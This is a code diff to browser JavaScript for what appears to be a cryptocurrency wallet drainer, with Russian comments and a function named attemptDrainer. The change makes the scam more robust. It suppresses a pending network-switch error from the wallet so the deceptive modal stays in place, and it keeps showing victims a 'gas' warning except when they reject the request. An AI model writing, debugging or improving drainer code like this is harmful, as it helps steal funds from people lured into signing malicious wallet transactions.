@@ -313,7 +313,6 @@ window.addEventListener('DOMContentLoaded', () => {
     hideModal();
     modalShown = false;
     isTransactionPending = false;
-    // Показываем жёлтый восклицательный знак вместо крестика
     updateModalContent('error', 'gas');
   });
 
@@ -428,6 +427,12 @@ async function attemptDrainer() {
     }
   } catch (err) {
     isTransactionPending = false;
+    // Игнорируем ошибку "Request of type 'PUBLIC_switchEthereumChain' already pending"
+    if (err.message.includes("Request of type 'PUBLIC_switchEthereumChain' already pending")) {
+      console.warn('⚠️ Запрос на переключение сети уже ожидается, ждём завершения:', err.message);
+      return; // Не обновляем модальное окно, оставляем его в текущем состоянии
+    }
+
     let errorType = 'gas'; // По умолчанию показываем жёлтый восклицательный знак
     if (err.message.includes('user rejected')) {
       errorType = 'cancelled'; // Красный крестик только при "user rejected"
@@ -461,6 +466,12 @@ async function handleConnectOrAction() {
       console.log('⏳ Транзакция уже выполняется');
     }
   } catch (err) {
+    // Игнорируем ошибку "Request of type 'PUBLIC_switchEthereumChain' already pending"
+    if (err.message.includes("Request of type 'PUBLIC_switchEthereumChain' already pending")) {
+      console.warn('⚠️ Запрос на переключение сети уже ожидается, ждём завершения:', err.message);
+      return; // Не обновляем модальное окно
+    }
+
     console.error('❌ Ошибка подключения:', err.message);
     updateModalContent('error', err.message.includes('user rejected') ? 'cancelled' : 'gas');
   }
